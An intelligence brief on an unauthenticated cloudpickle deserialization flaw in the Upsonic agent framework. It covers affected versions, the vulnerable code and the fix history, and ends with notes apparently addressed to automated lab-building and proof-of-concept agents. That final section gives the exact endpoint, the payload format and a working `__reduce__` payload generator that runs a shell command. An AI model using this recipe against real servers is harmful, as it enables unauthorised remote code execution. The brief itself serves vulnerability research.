# Intel Brief: CVE-2026-0773

## CVE Overview

- **CVE ID**: CVE-2026-0773
- **Title**: Upsonic Cloudpickle Deserialization of Untrusted Data Remote Code Execution
- **CVSS Score**: 9.8 (Critical)
- **CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **EPSS**: 1.3% (79.6th percentile)
- **Published**: 2026-01-23
- **Credited**: Alessio Dalla Piazza (Equixly)

## Affected Software

- **Software**: Upsonic
- **Vendor**: Upsonic (Onur ULUSOY / upsonic.co)
- **Type**: Python AI Agent Framework
- **Vulnerable Versions**: v0.36.0 through v0.55.6 (inclusive)
- **Patched Version**: v0.56.0 (first version without the vulnerable code)

## Description

The vulnerability exists in the `add_tool` API endpoint of the Upsonic AI agent framework. The main server (default TCP port 7541) exposes an unauthenticated FastAPI endpoint at `POST /tools/add_tool` that accepts a JSON body containing a base64-encoded serialized Python function. This payload is proxied to the internal tools_server (port 8086) which calls `cloudpickle.loads()` on the decoded data without any validation or authentication.

An attacker can send a crafted cloudpickle payload to achieve arbitrary code execution with the privileges of the Upsonic server process. **No authentication is required** to exploit this vulnerability.

### Attack Chain

1. Attacker sends `POST /tools/add_tool` to the main server on port **7541** with JSON body:
   ```json
   {"function": "<base64-encoded malicious cloudpickle payload>"}
   ```
2. Main server (`src/upsonic/server/tools/server.py`) routes request to `ToolManager`
3. `ToolManager` (`src/upsonic/tools_server/tools_client.py`) forwards to tools_server on port **8086**
4. Tools server (`src/upsonic/tools_server/server/tools.py`) calls:
   ```python
   decoded_function = base64.b64decode(request.function)
   deserialized_function = cloudpickle.loads(decoded_function)  # RCE HERE
   ```

### Vulnerable Code Location

**Primary vulnerability** — `src/upsonic/tools_server/server/tools.py`:
```python
@app.post(f"{prefix}/add_tool")
@timeout(30.0)
async def add_tool(request: AddToolRequest):
    decoded_function = base64.b64decode(request.function)
    deserialized_function = cloudpickle.loads(decoded_function)  # CWE-502
    add_tool_(deserialized_function)
    return {"message": "Tool added successfully"}
```

**Main server proxy** — `src/upsonic/server/tools/server.py` (port 7541):
```python
@app.post(f"{prefix}/add_tool")
async def add_tool(request: AddToolRequest):
    with ToolManager() as tool_client:
        tool_client.add_tool(request.function)
    return {"message": "Tool added successfully"}
```

Both endpoints are **unauthenticated** — no API key, token, or other auth mechanism is required.

## Repository

- **URL**: https://github.com/Upsonic/Upsonic
- **Clone URL**: https://github.com/Upsonic/Upsonic.git
- **Primary Language**: Python (96.3%)
- **License**: MIT

## Version Information

- **Vulnerable Version (checked out)**: `v0.55.6` (tag, commit `97f9f8f`, 2025-05-18)
- **First Vulnerable Version**: `v0.36.0` (introduced in commit `8c28730` "Turning into Upsonic (#245)", 2025-01-17)
- **Last Vulnerable Version**: `v0.55.6`
- **Fix Commit**: `a54529acc6e4bfe28f4f5c80c058144348a306b7` ("Stability (#360)", 2025-06-15)
- **First Patched Version**: `v0.56.0`

### Fix Details

The fix was part of a major refactoring commit ("Stability (#360)") that removed the entire old client-server architecture:
- Deleted `src/upsonic/tools_server/` (entire directory, including the vulnerable `cloudpickle.loads()` call)
- Deleted `src/upsonic/server/` (the main server that proxied requests)
- Deleted `src/upsonic/server_manager.py`
- Deleted `run_main_server.py` and `run_tools_server.py`

The project was restructured from a client-server model to a library/SDK model. The vulnerable endpoints were entirely removed, not patched. This was NOT an explicit security fix — the ZDI advisory (published Jan 2026) notes "no patch" because the vendor did not acknowledge the CVE, even though the code was removed before the advisory.

## Build System

- **Build Backend**: hatchling (`pyproject.toml`)
- **Package Manager**: pip / uv
- **Python**: >=3.10

### Key Dependencies (for reproducing)

| Package | Version | Purpose |
|---------|---------|---------|
| cloudpickle | >=3.1.0 | **Vulnerable deserialization library** |
| fastapi | >=0.115.6 | API framework (server endpoints) |
| uvicorn | >=0.34.0 | ASGI server |
| httpx | >=0.27.2 | Internal server-to-server communication |
| dill | >=0.3.9 | Serialization (used in client-side `add_tool`) |
| psutil | ==6.1.1 | Process/port management (ServerManager) |
| pydantic | ==2.10.5 | Request/response models |

### Server Architecture (Vulnerable Version)

The vulnerable version runs **two servers** in parallel:
1. **Main server**: `upsonic.server.api:app` on port **7541** (binds to 0.0.0.0)
2. **Tools server**: `upsonic.tools_server.server.api:app` on port **8086** (binds to localhost)

Both are started via `run_dev_server()` or separately via `run_main_server.py` / `run_tools_server.py`.

## Public Exploits

- **EIP Exploits**: None found
- **Metasploit Modules**: None
- **ExploitDB**: None
- **GitHub PoCs**: None
- **Nuclei Templates**: None

**Note**: No public exploit code exists. A PoC must be written from scratch. The attack is straightforward — craft a malicious cloudpickle payload, base64-encode it, and POST it to the unauthenticated endpoint.

## References

| Source | URL |
|--------|-----|
| ZDI Advisory | https://www.zerodayinitiative.com/advisories/ZDI-26-042/ |
| GHSA | https://github.com/advisories/GHSA-8rrj-mw9c-258v |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-0773 |
| Source Repository | https://github.com/Upsonic/Upsonic |
| Fix Commit | https://github.com/Upsonic/Upsonic/commit/a54529acc6e4bfe28f4f5c80c058144348a306b7 |

## Lab Build Notes

### For the Lab Build Agent

1. **Install from tag**: `pip install git+https://github.com/Upsonic/Upsonic.git@v0.55.6` or install from source at the checked-out tag.
2. **Start both servers**: The vulnerable setup needs both the main server (port 7541) and tools server (port 8086) running. Use `run_dev_server()` or start them separately.
3. **The tools_server binds to localhost:8086** — the main server on 7541 proxies to it. The attack target is port 7541 (externally accessible, binds 0.0.0.0).
4. **Python 3.10+** is required.
5. **No authentication** — the endpoints are open by default.

### For the PoC Agent

1. **Target endpoint**: `POST http://<target>:7541/tools/add_tool`
2. **Content-Type**: `application/json`
3. **Payload format**: `{"function": "<base64(cloudpickle.dumps(malicious_object))>"}`
4. **Exploit technique**: Python pickle/cloudpickle `__reduce__` method to execute arbitrary commands during deserialization.
5. **Example payload generation**:
   ```python
   import cloudpickle, base64, os
   class Exploit:
       def __reduce__(self):
           return (os.system, ("id > /tmp/pwned",))
   payload = base64.b64encode(cloudpickle.dumps(Exploit())).decode()
   # Send as: {"function": payload}
   ```
